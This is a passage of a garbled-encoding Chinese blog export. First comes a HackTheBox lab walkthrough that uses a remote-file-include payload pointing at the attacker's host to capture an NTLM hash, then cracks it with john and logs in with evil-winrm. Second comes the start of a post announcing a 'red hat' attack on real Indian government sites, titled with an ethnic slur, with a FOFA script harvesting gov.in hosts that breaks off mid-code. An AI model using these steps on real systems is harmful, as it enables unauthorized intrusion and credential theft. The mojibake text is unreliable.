<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment">#responder -h</span></span><br><span class="line"></span><br><span class="line">ç”¨æ³•ï¼šresponder -I eth0 -w -d</span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">responder -I eth0 -wd</span><br><span class="line"></span><br><span class="line">é€‰é¡¹ï¼š</span><br><span class="line">   --version æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·å¹¶é€€å‡º</span><br><span class="line">   -h, --<span class="built_in">help</span> æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º</span><br><span class="line">   -A, --analyze åˆ†ææ¨¡å¼ã€‚ æ­¤é€‰é¡¹å…è®¸æ‚¨æŸ¥çœ‹NBT-NSï¼Œ</span><br><span class="line">                         BROWSERã€LLMNR è¯·æ±‚æ²¡æœ‰å“åº”ã€‚</span><br><span class="line">   -I eth0ï¼Œ--æ¥å£=eth0</span><br><span class="line">                         è¦ä½¿ç”¨çš„ç½‘ç»œæ¥å£ï¼Œå¯ä»¥ä½¿ç”¨â€œALLâ€ä½œä¸º</span><br><span class="line">                         æ‰€æœ‰æ¥å£çš„é€šé…ç¬¦</span><br><span class="line">   -i 10.0.0.21,--ip=10.0.0.21</span><br><span class="line">                         è¦ä½¿ç”¨çš„æœ¬åœ° IPï¼ˆä»…é€‚ç”¨äº OSXï¼‰</span><br><span class="line">   -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed</span><br><span class="line">                         ä½¿ç”¨å…¶ä»– IPv6 åœ°å€å¯¹æ‰€æœ‰è¯·æ±‚è¿›è¡Œæ¯’å®³</span><br><span class="line">                         å“åº”è€…ä¹‹ä¸€ã€‚</span><br><span class="line">   -e 10.0.0.22, --externalip=10.0.0.22</span><br><span class="line">                         ä½¿ç”¨å…¶ä»– IP åœ°å€æ¯’å®³æ‰€æœ‰è¯·æ±‚</span><br><span class="line">                         å“åº”è€…ä¹‹ä¸€ã€‚</span><br><span class="line">   -b, --basic è¿”å›åŸºæœ¬ HTTP èº«ä»½éªŒè¯ã€‚ é»˜è®¤å€¼ï¼šNTLM</span><br><span class="line">   -d, --DHCP å¯ç”¨ DHCP å¹¿æ’­è¯·æ±‚çš„åº”ç­”ã€‚ è¿™</span><br><span class="line">                         é€‰é¡¹å°†åœ¨ DHCP å“åº”ä¸­æ³¨å…¥ WPAD æœåŠ¡å™¨ã€‚</span><br><span class="line">                         é»˜è®¤å€¼ï¼šå‡</span><br><span class="line">   -D, --DHCP-DNS è¯¥é€‰é¡¹å°†åœ¨ DHCP ä¸­æ³¨å…¥ DNS æœåŠ¡å™¨</span><br><span class="line">                         å“åº”ï¼Œå¦åˆ™å°†æ·»åŠ  WPAD æœåŠ¡å™¨ã€‚</span><br><span class="line">                         é»˜è®¤å€¼ï¼šå‡</span><br><span class="line">   -w, --wpad å¯åŠ¨ WPAD æ¶æ„ä»£ç†æœåŠ¡å™¨ã€‚ é»˜è®¤å€¼ä¸º</span><br><span class="line">                         é”™è¯¯çš„</span><br><span class="line">   -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY</span><br><span class="line">                         æ¶æ„ WPAD ä»£ç†ä½¿ç”¨çš„ä¸Šæ¸¸ HTTP ä»£ç†</span><br><span class="line">                         ä¼ å‡ºè¯·æ±‚ï¼ˆæ ¼å¼ï¼šä¸»æœº:ç«¯å£ï¼‰</span><br><span class="line">   -F, --ForceWpadAuth å¯¹ wpad.dat æ–‡ä»¶å¼ºåˆ¶è¿›è¡Œ NTLM/Basic èº«ä»½éªŒè¯</span><br><span class="line">                         æ¢å¤ã€‚ è¿™å¯èƒ½ä¼šå¯¼è‡´ç™»å½•æç¤ºã€‚ é»˜è®¤ï¼š</span><br><span class="line">                         é”™è¯¯çš„</span><br><span class="line">   -P, --ProxyAuth å¼ºåˆ¶ NTLMï¼ˆé€æ˜ï¼‰/åŸºæœ¬ï¼ˆæç¤ºï¼‰</span><br><span class="line">                         ä»£ç†çš„èº«ä»½éªŒè¯ã€‚ WPAD ä¸éœ€è¦</span><br><span class="line">                         åœ¨ã€‚ è¿™ä¸ªé€‰é¡¹éå¸¸æœ‰æ•ˆã€‚ é»˜è®¤å€¼ï¼šå‡</span><br><span class="line">   --lm å¼ºåˆ¶ Windows XP/2003 å’Œ LM å“ˆå¸Œé™çº§</span><br><span class="line">                         æ—©äº›æ—¶å€™ã€‚ é»˜è®¤å€¼ï¼šå‡</span><br><span class="line">   --disable-ess å¼ºåˆ¶ ESS é™çº§ã€‚ é»˜è®¤å€¼ï¼šå‡</span><br><span class="line">   -v, --verbose å¢åŠ è¯¦ç»†ç¨‹åº¦ã€‚</span><br></pre></td></tr></table></figure>
<h2 id="0x03-é¶åœºå®æˆ˜responderä¸evil-winrmé…åˆè¿œç¨‹ç™»å½•windows"><a class="markdownIt-Anchor" href="#0x03-é¶åœºå®æˆ˜responderä¸evil-winrmé…åˆè¿œç¨‹ç™»å½•windows"></a> 0x03 é¶åœºå®æˆ˜â€“Responderä¸evil-winRMé…åˆè¿œç¨‹ç™»å½•windows</h2>
<p>æµ‹è¯•ç¯å¢ƒï¼š</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> ï¼ˆæ”»å‡»æœºï¼‰   <span class="number">192.168.154.128</span> </span><br><span class="line"><span class="attribute">vpn</span>æ¥å…¥å†…ç½‘ç¯å¢ƒ: ip -&gt; <span class="number">10.10.14.115</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">HTB</span>é¶æœº windows <span class="number">10</span> ï¼ˆå—å®³æœºï¼‰ <span class="number">10.129.48.161</span></span><br></pre></td></tr></table></figure>
<p>å¼€å¯é¶æœº</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230806235738164.png" alt="image-20230806235738164"></p>
<p>å‰ç½®çš„æ­¥éª¤ç®€å•è¿‡ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>TASK 1</p>
<p>When visiting the web service using the IP address, what is the domain that we are being redirected to?</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">unika.htb</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ç›´æ¥curlæ¢æµ‹ä¸€ä¸‹å°±è¡Œ</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807004726426.png" alt="image-20230807004726426"></p>
<p>è®¿é—®åŸŸåéœ€è¦åœ¨æœ¬åœ°çš„hostsæ–‡ä»¶å°±è¡Œä¸€ä¸ªé…ç½®ï¼š</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010259553.png" alt="image-20230807010259553"></p>
<blockquote>
<p>TASK 2</p>
<p>Which scripting language is being used on the server to generate webpages?</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PHP</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>ç›´æ¥ä½¿ç”¨<strong>wappalyzer</strong>æ’ä»¶å³å¯</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807005131865.png" alt="image-20230807005131865"></p>
<blockquote>
<p>TASK 3</p>
<p>What is the name of the URL parameter which is used to load different language versions of the webpage?</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">page</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼š</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807005737023.png" alt="image-20230807005737023"></p>
<blockquote>
<p>TASK 4</p>
<p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: â€œfrench.htmlâ€, â€œ<a href="//10.10.14.6/somefile">//10.10.14.6/somefile</a>â€, â€œâ€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/windows/system32/drivers/etc/hostsâ€, â€œminikatz.exeâ€</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>windows<span class="regexp">/system32/</span>drivers<span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>
</blockquote>
<p>è¿™é‡Œç†Ÿæ‚‰**æ–‡ä»¶åŒ…å«æ¼æ´(FI)**å¸ˆå‚…èƒ½ç›´æ¥getåˆ°ç‚¹ï¼š</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010014461.png" alt="image-20230807010014461"></p>
<blockquote>
<p>TASK 5</p>
<p>Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: â€œfrench.htmlâ€, â€œ<a href="//10.10.14.6/somefile">//10.10.14.6/somefile</a>â€, â€œâ€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/windows/system32/drivers/etc/hostsâ€, â€œminikatz.exeâ€</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span><span class="number">10.10</span>.<span class="number">14.6</span>/somefile</span><br></pre></td></tr></table></figure>
</blockquote>
<p>è¿™é‡Œå’Œä¸Šä¸€é—®åŒç†</p>
<blockquote>
<p>TASK 6</p>
<p>What does NTLM stand for?</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">NT (<span class="name">New</span> Technology) LAN Manager (<span class="name">NTLM</span>)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>æŸ¥é˜…Wikiç™¾ç§‘å°±è¡Œï¼ˆå¯ä»¥å¾€ä¸‹æ·±å…¥äº†è§£ï¼Œè¿™æ˜¯å†…ç½‘çš„å¼€å§‹â€¦<img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010533593.png" alt="image-20230807010533593"></p>
<blockquote>
<p>TASK 7</p>
<p>Which flag do we use in the Responder utility to specify the network interface?</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">-<span class="selector-tag">I</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>é€šè¿‡ä¸Šé¢çš„å¸®åŠ©æ–‡æ¡£å¯ä»¥çŸ¥é“</p>
<blockquote>
<p>TASK 8</p>
<p>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">John the Ripper</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¹Ÿæ˜¯æŸ¥é˜…Wikiç™¾ç§‘å³å¯</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807010848902.png" alt="image-20230807010848902"></p>
<h3 id="æœ¬æ–‡çš„å…³é”®æ“ä½œå¯ç›´æ¥è·³è‡³æ­¤å¤„"><a class="markdownIt-Anchor" href="#æœ¬æ–‡çš„å…³é”®æ“ä½œå¯ç›´æ¥è·³è‡³æ­¤å¤„"></a> æœ¬æ–‡çš„å…³é”®æ“ä½œï¼Œå¯ç›´æ¥è·³è‡³æ­¤å¤„</h3>
<p><mark>æ¥ä¸‹æ¥å°†æ˜¯æœ¬æ–‡çš„é‡ç‚¹æ“ä½œ</mark>ï¼š</p>
<p>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹è‡ªèº«ipï¼ˆvpnï¼‰ï¼Œå¹¶å¼€å¯ç›‘å¬</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012015738.png" alt="image-20230807012015738"></p>
<p>å¼€å¯ç›‘å¬ï¼š<code>responder -I tun0 -w -d</code></p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012128742.png" alt="image-20230807012128742"></p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012239477.png" alt="image-20230807012239477"></p>
<p>æ¥ç€åˆ©ç”¨webç«¯çš„**è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´(RFI)**è®¿é—®æˆ‘è‡ªèº«(10.10.14.115)çš„ä»»æ„æ–‡ä»¶ï¼Œè¿›è¡Œä¸€ä¸ªHashæ³„éœ²</p>
<p><strong>payloadï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://unika.htb/index.php?page=//10.10.14.115/somefile</span><br></pre></td></tr></table></figure>
<p>Responderå°±å¯ä»¥æ•è·åˆ°æ¥è‡ªå—å®³æœº(10.129.48.161)å¸¦æœ‰<strong>ç”¨æˆ·çš„å¯†ç (password)çš„Hashå€¼</strong></p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807012755978.png" alt="image-20230807012755978"></p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">Administrator:<span class="type"></span>:RESPONDER:<span class="type">9baf19c29ef21567</span>:<span class="number">761</span>FED4C7E3DB9BCFEF3E747E797B10D:<span class="type">010100000000000000E56ED168C8D901D119B9B66118B37A00000000020008004E0044004200450001001E00570049004E002D004C004C0047004200590033003100340035005800510004003400570049004E002D004C004C004700420059003300310034003500580051002E004E004400420045002E004C004F00430041004C00030014004E004400420045002E004C004F00430041004C00050014004E004400420045002E004C004F00430041004C000700080000E56ED168C8D901060004000200000008003000300000000000000001000000002000008400CDB8B7CEB11867758BC8795830343D40C19570BB7035C3D1AF789B7CE19F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310035000000000000000000</span></span><br></pre></td></tr></table></figure>
<p>å°†è¿™æ®µå­—ç¬¦ä¸²ä¿å­˜åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ä¸­ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨JHONè¿›è¡Œä¸€ä¸ªHashçˆ†ç ´ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john -w=/usr/share/wordlists/rockyou.txt admin.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807013110709.png" alt="image-20230807013110709"></p>
<p>èƒ½å¤Ÿè·å–åˆ°Administratorç”¨æˆ·çš„å¯†ç ä¸ºï¼šbadminton</p>
<blockquote>
<p>TASK 9</p>
<p>What is the password for the administrator user?</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">badminton</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>TASK 10</p>
<p>Weâ€™ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">5985</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä½¿ç”¨nmapè¿›è¡Œä¸€ä¸ªå¼€æ”¾ç«¯å£æ¢æµ‹å³å¯ï¼š</p>
<figure class="highlight nim"><table><tr><td class="code"><pre><span class="line">nmap -p- --min-rate <span class="number">1000</span> -sV <span class="number">10</span>.<span class="number">129</span>.<span class="number">48</span>.<span class="number">161</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807013453353.png" alt="image-20230807013453353"></p>
<p>æ‹¿åˆ°ç”¨æˆ·çš„è´¦æˆ·å’Œå¯†ç ä¹‹åå°±åˆ°äº†ä¸€å¼€å§‹æ‰€æåˆ°çš„evil-winRMçš„ä½¿ç”¨äº†</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">evil</span>-winrm -i <span class="number">10.129</span><span class="number">.48</span><span class="number">.161</span> -u administrator -p badminton</span><br></pre></td></tr></table></figure>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807013831906.png" alt="image-20230807013831906"></p>
<p>è¿™æ ·å°±å¯ä»¥è¿œç¨‹ç™»å½•windowsæœåŠ¡å™¨å•¦ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬èƒ½åšåˆ°çš„äº‹å„¿æœ‰å¾ˆå¤šã€‚</p>
<p>ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯æ‰¾é¢˜ç›®éœ€è¦çš„flag</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807014120801.png" alt="image-20230807014120801"></p>
<p>æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„flagæ–‡ä»¶åªæ˜¯æœ€åŸºç¡€çš„ï¼Œåˆ«ç€æ€¥æäº¤ï¼Œä¸ç„¶å°±æµªè´¹è¿™ä¸ªç»ƒä¹ å·¥å…·çš„å¥½æœºä¼šäº†</p>
<p>å¯ä»¥å¤šè¯•è¯•å‡ ä¸ªå‘½ä»¤ï¼š</p>
<p><strong>menu</strong>ï¼šåŠ è½½Invoke-Binaryå’Œl04d3r-LoadDllå‡½æ•°ã€‚å½“åŠ è½½ps1æ—¶ï¼Œä¼šæ˜¾ç¤ºå…¶æ‰€æœ‰åŠŸèƒ½ã€‚</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807014438379.png" alt="image-20230807014438379"></p>
<p><strong>download</strong>ï¼šä¸‹è½½è¿œç¨‹æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œå¦‚æœè¿œç¨‹æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸­ï¼Œåˆ™ä¸éœ€è¦local_pathã€‚</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">download local_path remote_path</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯ä»¥å°è¯•ä¸€ä¸‹ä¸‹è½½flag.txt</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807014805570.png" alt="image-20230807014805570"></p>
<p><strong>upload</strong>ï¼šä»æœ¬åœ°ï¼ˆkaliï¼‰ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœºå™¨ï¼Œå¦‚æœæœ¬åœ°æ–‡ä»¶ä¸evil-winrm.rbæ–‡ä»¶ä½äºåŒä¸€ç›®å½•ä¸­ï¼Œåˆ™ä¸éœ€è¦remote_pathã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload local_path remote_path</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯ä»¥è¯•ç€ä¼ ä¸€ä¸ªtxtæ–‡ä»¶</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807015126775.png" alt="image-20230807015126775"></p>
<p><strong>Invoke-Binary</strong>ï¼šå…è®¸åœ¨å†…å­˜ä¸­æ‰§è¡Œä»c#ç¼–è¯‘çš„exeã€‚è¯¥åç§°å¯ä½¿ç”¨tabé”®è‡ªåŠ¨è¡¥å…¨ï¼Œæœ€å¤šå…è®¸3ä¸ªå‚æ•°ã€‚å¯æ‰§è¡Œæ–‡ä»¶å¿…é¡»åœ¨-eå‚æ•°è®¾ç½®çš„è·¯å¾„ä¸­ã€‚</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807015427827.png" alt="image-20230807015427827"></p>
<p>è¿™é‡Œç”±äºæˆ‘åœ¨è¿æ¥æ—¶å¹¶æœªæŒ‡å®šexeçš„è·¯å¾„æ‰€ä»¥è¿™é‡Œæ²¡æ³•æ­£å¸¸æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>**servicesï¼š**åˆ—å‡ºæ‰€æœ‰æœåŠ¡ï¼ˆæ— éœ€ç®¡ç†å‘˜æƒé™ï¼‰</p>
<p><img src="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/image-20230807015616926.png" alt="image-20230807015616926"></p>
<p><strong>åŠ è½½ powershell è„šæœ¬</strong></p>
<p>è¦åŠ è½½ps1æ–‡ä»¶ï¼Œä½ åªéœ€é”®å…¥åç§°ï¼ˆå¯ä»¥ä½¿ç”¨tabè‡ªåŠ¨è¡¥å…¨ï¼‰ã€‚è„šæœ¬å¿…é¡»ä½äº-så‚æ•°ä¸­è®¾ç½®çš„è·¯å¾„ä¸­ã€‚å†æ¬¡é”®å…¥menuå¹¶æŸ¥çœ‹åŠ è½½çš„åŠŸèƒ½ã€‚</p>
<p>è¿™é‡Œæˆ‘æ²¡æŒ‡å®šè·¯å¾„æ‰€ä»¥æ˜¯æ²¡æœ‰powershellè„šæœ¬çš„ï¼Œæ‰€ä»¥æ²¡æ³•æ­£å¸¸æ¼”ç¤ºã€‚</p>
<h3 id="æœ€å"><a class="markdownIt-Anchor" href="#æœ€å"></a> æœ€å</h3>
<p>æœ¬æ¬¡çš„åˆ†äº«å°±åˆ°è¿™å„¿ç»“æŸäº†ï¼Œå½“ç„¶è¿˜æœ‰å¾ˆå¤šçš„æ“ä½œå’Œç»†èŠ‚æ²¡æœ‰èƒ½å¤Ÿå±•ç¤ºåˆ°ï¼Œåç»­å°±ç•™ç»™å¸ˆå‚…ä»¬å»æ¢ç´¢äº†ã€‚</p>
<p>ä¸‹é¢é™„ä¸Šæœ¬æ–‡çš„å‚è€ƒæ–‡ç« é“¾æ¥ï¼š</p>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/sectool/210479.html">https://www.freebuf.com/sectool/210479.html</a></p>
<p>â€‹                    <a href="https://www.freebuf.com/articles/network/256844.html">https://www.freebuf.com/articles/network/256844.html</a></p>
<p>â€‹                    <a href="https://www.freebuf.com/sectool/210479.html">https://www.freebuf.com/sectool/210479.html</a></p>
<p>â€‹                    <a href="https://www.kali.org/tools/evil-winrm/">https://www.kali.org/tools/evil-winrm/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>æ¸—é€</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€æ¬¡é’ˆå¯¹é˜¿ä¸‰çš„çº¢å¸½æ¸—é€æµ‹è¯•[getshell]</title>
    <url>/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/</url>
    <content><![CDATA[<p>æœ¬æ¬¡æ¸—é€æµ‹è¯•å±äºä¸€ä¸ªçº¢å¸½æ€§è´¨çš„ä¸€æ¬¡é’ˆå¯¹é˜¿ä¸‰çš„æ¸—é€æ”»å‡»ï¼Œç¾¤é‡Œå¤§å“¥ä¸€å£°å†å–ï¼Œå°å¼Ÿæˆ‘ç›´æ¥ç¬¬ä¸€ä¸ªå‡ºå‡»ã€‚</p>
<span id="more"></span>
<h1 id="ä¸€æ¬¡æš´éœ²é¢å…¨å¼€çš„çº¢å¸½æ¸—é€æµ‹è¯•getshell"><a class="markdownIt-Anchor" href="#ä¸€æ¬¡æš´éœ²é¢å…¨å¼€çš„çº¢å¸½æ¸—é€æµ‹è¯•getshell"></a> ä¸€æ¬¡æš´éœ²é¢å…¨å¼€çš„çº¢å¸½æ¸—é€æµ‹è¯•[getshell]</h1>
<p>å£°æ˜ï¼šæœ¬æ–‡ç« ä»…ç”¨ä½œæŠ€æœ¯äº¤æµå’ŒæŠ€æœ¯åˆ†äº«ï¼Œæ–‡ä¸­æ‰€æ¶‰åŠçš„ä»»ä½•å†…å®¹ä¸æ¸—é€æŠ€æœ¯è¢«è¯»è€…æ¶æ„ä½¿ç”¨æ‰€é€ æˆçš„åæœä¸ä½œè€…æœ¬äººæ— å…³ï¼</p>
<h2 id="0x01-ä¿¡æ¯æ”¶é›†é˜¶æ®µ"><a class="markdownIt-Anchor" href="#0x01-ä¿¡æ¯æ”¶é›†é˜¶æ®µ"></a> 0x01ã€ä¿¡æ¯æ”¶é›†é˜¶æ®µ</h2>
<p>==æ³¨ï¼šæœ¬æ¬¡ä¿¡æ¯æ”¶é›†è¿‡ç¨‹ä¸»è¦ä½¿ç”¨FOFAç½‘ç»œæ¢æµ‹å¹³å°Â <a href="https://fofa.info/===">https://fofa.info/===</a></p>
<p>ä¸€å¼€å§‹è¿›è¡Œæ”¶é›†çš„æ—¶å€™ï¼Œæœ‰ç‚¹è¿·ï¼Œç›´æ¥è¿›è¡Œäº†å¤§é¢ç§¯çš„&quot;<a href="http://gov.in">gov.in</a>&quot;åŸŸåæ”¶é›†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">host=&quot;gov.in&quot; &amp;&amp; country=&quot;IN&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711021949594.png" alt="image-20230711021949594"></p>
<p>å“ˆå“ˆ68465æ¡æ•°æ®ï¼Œæƒ³æƒ³å°±èµ·é£ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆä¸‹è½½åˆ°æœ¬åœ°ï¼Œé«˜çº§ç”¨æˆ·çš„APIä¹Ÿåªèƒ½è°ƒç”¨ä¸‹è½½1wæ¡æ•°æ®ï¼Œå·¦æ€å³æƒ³<img src="/2023/07/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9%E9%98%BF%E4%B8%89%E7%9A%84%E7%BA%A2%E5%B8%BD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-getshell/image-20230711022232842.png" alt="image-20230711022232842"></p>
<p>è¯•ç€å†™äº†ä¸ªè„šæœ¬çœ‹çœ‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pythonfofa</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;IN_domain.csv&quot;</span></span><br><span class="line"></span><br><span class="line">email = <span class="string">&#x27;u_mail&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;u_API_KEY&#x27;</span></span><br><span class="line">search = pythonfofa.Client(email, key)</span><br><span class="line">get_data = search.search(<span class="string">&#x27;host=&quot;gov.in&quot; &amp;&amp; country=&quot;IN&quot;&#x27;</span>, size=<span class="number">70000</span>)</span><br><span class="line"><span class="comment"># print(get_data)</span></span><br><span class="line"></span><br><span class="line">requests = [result[<span class="number">1</span>] <span class="keyword">for</span> result <span class="keyword">in</span> get_data[<span class="string">&#x27;results&#x27;</span>]]</span><br><span class="line"><span class="built_in">print</span>(requests)</span><br><span class="line"><span class="comment"># æ‰“å¼€CSVæ–‡ä»¶å¹¶è®¾ç½®å†™å…¥æ¨¡å¼</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>, newline=<span class="string">&quot;&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    writer = csv.writer(file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># éå†è¯·æ±‚åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> request <span class="keyword">in</span> requests:</span><br><span class="line">        <span class="comment"># åœ¨æ§åˆ¶å°æ‰“å°åŸŸå</span></span><br><span class="line">        <span class="built_in">print</span>(request)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æµ‹åŸŸåæ˜¯å¦åŒ…å«&quot;http://&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.startswith(<span class="string">&quot;http://&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> request.startswith(<span 